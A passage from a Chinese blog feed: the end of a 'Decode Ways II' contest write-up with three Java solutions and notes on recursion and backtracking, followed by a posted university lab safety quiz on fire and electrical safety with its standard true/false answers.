<p>如果当前数字小于 <code>7</code>，则 <code>*</code> 可以是 <code>1</code> 或 <code>2</code>。对应 <code>10-16</code> 或者 <code>20-26</code> 中任意一个数字。此时解码数量等于前$i−2$ 个字符解码数量的 2 倍。</p>
<p>在函数 <code>ways</code> 中实现所有的情况，递归调用 <code>ways</code> 计算所有字符的解码数量。记录已经计算出来的前 $i$ 个字符的解码数量，减少重复调用，降低计算复杂度。</p>
<p>Java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Integer[] memo=<span class="keyword">new</span> Integer[s.length()];</span><br><span class="line">        <span class="keyword">return</span> ways(s, s.length() - <span class="number">1</span>,memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ways</span><span class="params">(String s, <span class="keyword">int</span> i,Integer[] memo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(memo[i]!=<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> memo[i];</span><br><span class="line">        <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> res = <span class="number">9</span> * ways(s, i - <span class="number">1</span>,memo);</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">9</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">6</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">15</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            memo[i]=(<span class="keyword">int</span>)res;</span><br><span class="line">            <span class="keyword">return</span> memo[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> res = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? ways(s, i - <span class="number">1</span>,memo) : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            res = (res + ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            res = (res + ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                res = (res + (s.charAt(i)&lt;=<span class="string">&#x27;6&#x27;</span>?<span class="number">2</span>:<span class="number">1</span>) * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        memo[i]= (<span class="keyword">int</span>)res;</span><br><span class="line">        <span class="keyword">return</span> memo[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 表示输入字符串和备忘录数组的长度，备忘录数组中每项计算时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(n)$，递归树的深度为 $n$。</p>
</li>
</ul>
<p><strong>方法二：动态规划</strong><br><strong>算法</strong></p>
<p>从 方法一 可以看出，字符串前 $i$ 个字符的解码方法数量只与前 $i$ 个字符有关，与它后面的字符无关。因此该问题也可以使用动态规划解决。</p>
<p>如果知道字符串前 $i−1$ 个字符的解码数量和前 $i−2$ 个字符的解码数量，就可以计算出前 $i$ 个字符的解码数量。从前往后计算数组 $dp$ 中每一项，$dp[i]$ 表示字符串 $s$ 前 $i$ 个字符的编码数量。</p>
<p>通过一个简单实例的图解说明 $dp$ 的计算过程。</p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide1.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide2.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide3.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide4.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide5.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide6.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide7.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide8.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide9.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide10.PNG" alt="img"></p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span>[] dp = <span class="keyword">new</span> <span class="keyword">long</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = s.charAt(<span class="number">0</span>) == <span class="string">&#x27;*&#x27;</span> ? <span class="number">9</span> : s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>] = <span class="number">9</span> * dp[i];</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">9</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">6</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">15</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>] = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? dp[i] : <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + (s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span> ? <span class="number">2</span> : <span class="number">1</span>) * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 是输入字符串的长度，数组 $dp$ 长度为 $n+1$，计算数组每一项的时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(n)$，数组 $dp$ 的长度为 $n+1$。</p>
</li>
</ul>
<p><strong>方法三：恒定空间的动态规划</strong><br><strong>算法</strong></p>
<p>只要知道 $dp[i-2]$ 和 $dp[i-1]$ 就可以计算出 $dp[i]$。因此不需要保存数组 $dp$ 的所有值，只需要记录数组 $dp$ 的最后两个值就可以计算出下一项。其他过程与 方法二 相同。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> first = <span class="number">1</span>, second = s.charAt(<span class="number">0</span>) == <span class="string">&#x27;*&#x27;</span> ? <span class="number">9</span> : s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> temp = second;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                second = <span class="number">9</span> * second;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">9</span> * first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">6</span> * first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">15</span> * first) % M;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                second = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? second : <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    second = (second + first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    second = (second + first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    second = (second + (s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span> ? <span class="number">2</span> : <span class="number">1</span>) * first) % M;</span><br><span class="line">            &#125;</span><br><span class="line">            first = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 是输入字符串的长度，需要计算到第 $n$ 次才能得到所有字符的解码数量。</li>
<li>空间复杂度：$O(1)$，使用恒定空间。</li>
</ul>
<h6 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h6><p><strong>递归、回溯和DFS的区别</strong></p>
<ul>
<li>递归是一种算法结构，回溯是一种算法思想。</li>
<li>一个递归就是在函数中调用函数本身来解决问题。</li>
<li>回溯就是通过不同的尝试来生成问题的解，有点类似于穷举，但是和穷举不同的是回溯会“剪枝”</li>
</ul>
<p>回溯搜索是深度优先搜索（DFS）的一种。对于某一个搜索树来说（搜索树是起记录路径和状态判断的作用），回溯和DFS主要的区别是，回溯法在求解过程中不保留完整的树形结构，而深度优先搜索则记下完整的搜索树。</p>
<p><strong>递归的一般结构</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">     <span class="keyword">if</span>(符合边界条件)  </span><br><span class="line">     &#123;  </span><br><span class="line">        <span class="comment">///////  </span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">     &#125;  </span><br><span class="line"></span><br><span class="line">     <span class="comment">//某种形式的调用  </span></span><br><span class="line">     f();  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p><strong>回溯的一般结构</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> 当前状态)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">      <span class="keyword">if</span>(当前状态为边界状态)  </span><br><span class="line">      &#123;  </span><br><span class="line">        记录或输出  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)       <span class="comment">//横向遍历解答树所有子节点  </span></span><br><span class="line">      &#123;  </span><br><span class="line">           <span class="comment">//扩展出一个子状态。  </span></span><br><span class="line">           修改了全局变量  </span><br><span class="line">           <span class="keyword">if</span>(子状态满足约束条件)  </span><br><span class="line">            &#123;  </span><br><span class="line">              dfs(子状态)  </span><br><span class="line">           &#125;  </span><br><span class="line">            恢复全局变量<span class="comment">//回溯部分  </span></span><br><span class="line">      &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>数字消除这道题做的时候感觉还挺简单的，不知道为什么这道题的通过率反而是最低的，通过率28%提交次数243。解码方式这道最难的题反而通过率高达67%，提交次数91，不知道都怎么做的，有没有百度，我觉得还是自己好好做吧，主要为了提高自己嘛，成绩不那么重要😛。这次比赛在线编辑运行测试数据、提交代码检测结果太慢了，我提交完数字消除这道题后太慢了我才做的笛卡尔积那道题，数字消除还挺有自信的感觉是对的，好久才出评判结果，评判出错后我想着应该好改，就在做笛卡尔积那道题没怎么着急改，所以最后没有及时提交那道题。前三题都还可以，最后一道题感觉有点晕，也是我现在做题少的原因还是太菜了，继续加油吧。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>阿里云天池赛</tag>
      </tags>
  </entry>
  <entry>
    <title>东北大学软件学院实验室安全考试</title>
    <url>/2020/10/23/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1、[判断题] <strong>冷却灭火法是将可燃物冷却到其燃点以下，停止燃烧反应。</strong> （分值1.0）<br>                    你未作答            标准答案：                  正确                            </p>
<p>​     2、[判断题] <strong>实验室必须配备符合本室要求的消防器材，消防器材要放置在明显或便于拿取的位置。严禁任何人以任何借口把消防器材移作它用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     3、[判断题] <strong>实验室应配备相应的消防器材。参加实验人员要熟悉其存放位置及使用方法并掌握有关的灭火知识。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<a id="more"></a>
<p>​     4、[判断题] <strong>若被火场浓烟所困，应迅速起身跑出火场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     5、[判断题] <strong>使用手提灭火器时，拨掉保险销，对准着火点根部用力压下压把，灭火剂喷出，就可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     6、[判断题] <strong>消防工作的方针是：“预防为主，防消结合”，实行消防安全责任制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     7、[判断题] <strong>建筑物发生火灾时，乘坐电梯疏散即快速又安全省力。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     8、[判断题] <strong>液体着火时，应用灭火器灭火，不能用水扑救或其它物品扑打。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     9、[判断题] <strong>消防队在扑救火灾时，有权根据灭火的需要，拆除或者破损临近火灾现场的建筑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     10、[判断题] <strong>在附近无水源，身上着火来不及脱衣服时，应就地打滚，将火苗压灭进行自救。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     11、[判断题] <strong>二氧化碳灭火器使用不当，可能会造成冻伤。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     12、[判断题] <strong>当发生火情时尽快沿着疏散指示标志和安全出口方向迅速离开火场。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     13、[判断题] <strong>大火封门无路可逃时，可用浸湿的被褥、衣物堵塞门缝，向门上泼水降温，以延缓火灾蔓延时间，呼叫待援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     14、[判断题] <strong>爆炸是指物质瞬间突然发生物理或化学变化，同时释放出大量的气体和能量（光能、热能、机械能）并伴有巨大声响的现象。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     15、[判断题] <strong>隔离灭火法是将可燃物与引火源或氧气隔离开来，可防止火势继续扩大。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     16、[判断题] <strong>火灾发生后，当所有的逃生线路被大火封锁时，应立即退回室内，用手电筒、挥舞衣物、呼叫等方式向窗外发送求救信号，等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     17、[判断题] <strong>火灾发生后，受到火势威胁时，要当机立断披上浸湿的衣物、被褥等向安全出口方向冲去。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     18、[判断题] <strong>火灾发生后，穿过浓烟逃生时，必须尽量贴近地面，并用湿毛巾捂住口鼻。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     19、[判断题] <strong>扑救毒害性、腐蚀性或燃烧产物毒害性较强的火灾时，必须配戴防护面具。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     20、[判断题] <strong>扑救气体火灾切忌盲目扑灭火势，首先应切断火势蔓延途径，然后疏散火势中压力容器或受到火焰辐射热威胁的压力容器，不能疏散的部署水枪进行冷却保护。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     21、[判断题] <strong>如果可燃液体在容器内燃烧时，应从容器的一侧上部向容器中喷射但注意不能将喷流直接喷射在燃烧液面上，防止灭火剂的冲力将可燃液体冲出容器而扩大火势。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     22、[判断题] <strong>当可燃烧液体呈流淌状燃烧时，应将灭火剂的喷流对准火焰根部由近而远并左右扫射，向前快速推进，直至火焰扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     23、[判断题] <strong>火灾发生后，千万不要盲目跳楼，可利用疏散楼梯、阳台、窗口等逃生自救。也可用绳子或把床单、被套等撕成条状连成绳索，紧拴在窗框、铁栏杆等可靠的固定物上，用毛巾、布条等保护手心，顺绳滑下，或下到未着火的楼层进行逃生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     24、[判断题] <strong>实验室一旦发生起火，不要惊慌失措，应利用消防器材，采取有效措施控制、扑灭火灾。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     25、[判断题] <strong>发现实验室楼的配电箱起火，可以用楼内的消火栓放水灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     26、[判断题] <strong>实验室发生火警、火灾时，应立即采取措施灭火，并报保卫处或119。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     27、[判断题] <strong>使用激光扫描仪预览和扫描资料时，可以不盖上扫描仪盖子。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     28、[判断题] <strong>学生、新员工进实验室之前要参加安全教育和培训，经培训、考核合格后方可进入实验室学习与工作；学生要在老师指导下开展实验研究。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     29、[判断题] <strong>做实验时要爱护实验设备，同时注意自身的安全，避免发生事故。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     30、[判断题] <strong>实验过程中如发生事故，应冷静妥善地处理，尽量把事故解决在萌芽状态。如较为严重，有危及人身安全可能时，应及时撤离现场，并通知邻近实验室工作人员迅速撤离，尽快报警。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     31、[判断题] <strong>安全事故处理应本着先人后物的原则，果断地、坚决地快速处置。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     32、[判断题] <strong>在清洁、维修仪器时，应先断电并确保无人能开启仪器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     33、[判断题] <strong>触电紧急救护时，首先应使触电者脱离电源，然后立即进行人工呼吸、心脏按压。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     34、[判断题] <strong>在触电现场，若触电者已经没有呼吸或脉搏，此时可以判定触电者已经死亡，可以放弃抢救。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     35、[判断题] <strong>雷电发生时，如果作业人员孤立处于暴露区时，应该立即双手抱膝下蹲，向前弯曲。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     36、[判断题] <strong>发现有人触电，应立即切断电源，不能直接拉触电者，应用木棒或其它绝缘物将人与带电体分离。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     37、[判断题] <strong>当有人发生触电事故时，应马上直接将其拉开。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     38、[判断题] <strong>要保持实验室环境整洁，做到地面、桌面、设备三整洁，减少安全隐患。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     39、[判断题] <strong>实验室安全工作的中心任务是防止发生人员伤亡、财产和科研资料损失。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     40、[判断题] <strong>高校实验室发生安全事故的主要原因有：操作不慎、粗心大意、设施老化、缺少防护设施等。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     41、[判断题] <strong>加强计算机的安全管理，建立病毒防护系统并不断加以更新，重要的数据资料应定期进行备份。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     42、[判断题] <strong>创造安全、卫生的实验室工作环境，仅仅是实验工作人员的责任。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     43、[判断题] <strong>使用U盘拷贝资料，应先对U盘杀毒，防止病毒感染 。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     44、[判断题] <strong>测试数据应进行异地备份。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     45、[判断题] <strong>有“严禁烟火”警示牌的大楼和实验室，可不必配置必要的消防、冲淋、洗眼、报警和逃生设施和有明显标志。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     46、[判断题] <strong>在实验室发生事故时，现场人员应迅速组织、指挥，切断事故源，尽量阻止事态蔓延、保护现场；及时有序地疏散学生等人员，对现场已受伤人员作好自助自救、保护人身及财产。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     47、[判断题] <strong>教师应学习研究有关实验室安全的知识，同时在理论教学和实验中对学生进行安全知识教育、教会学生如何正确使用实验设备和实验操作，教会学生在突发事故发生时如何自我保护、相互救援、安全撤离。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     48、[判断题] <strong>早晨、中饭、晚上等几个人员稀少的时间段，要特别注意随手关门，确保实验室财产和个人物品的安全。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     49、[判断题] <strong>及时淘汰老化、性能不稳又具有安全隐患的仪器设备（如冰箱10年以上，烘箱12年以上）。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     50、[判断题] <strong>发生各类案件时应立即报案，妥善保护案发现场，若有人受伤，在救人时应尽可能记住现场破坏前的情况（如手机拍照等）。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     51、[判断题] <strong>实验室人员发生触电时，应迅速切断电源，将触电者上衣解开，取出口中异物，然后进性人工呼吸。当患者恢复呼吸时，应立即送医院。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     52、[判断题] <strong>水具有导电性，不宜扑救带电设备的火灾，不能扑救遇水燃烧物质或非水溶性燃烧液体的火灾。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     53、[判断题] <strong>实验室灭火的方法要针对起因选用合适的方法。一般小火可用湿布、石棉布或沙子覆盖燃烧物即可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     54、[判断题] <strong>实验大楼出现火情时千万不要乘电梯，因为电梯可能因停电或失控，同时又因“烟囱效应”，电梯井常常成为浓烟的 流通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     55、[判断题] <strong>使用手提灭火器时，拨掉保险销，握住胶管前端， 对准燃烧物根部用力压下压把，灭火剂喷出，左右扫射，就可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     56、[判断题] <strong>有“严禁烟火”警示牌的大楼和实验室，可不必配 置必要的消防、冲淋、洗眼、报警和逃生设施和有明显标志。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
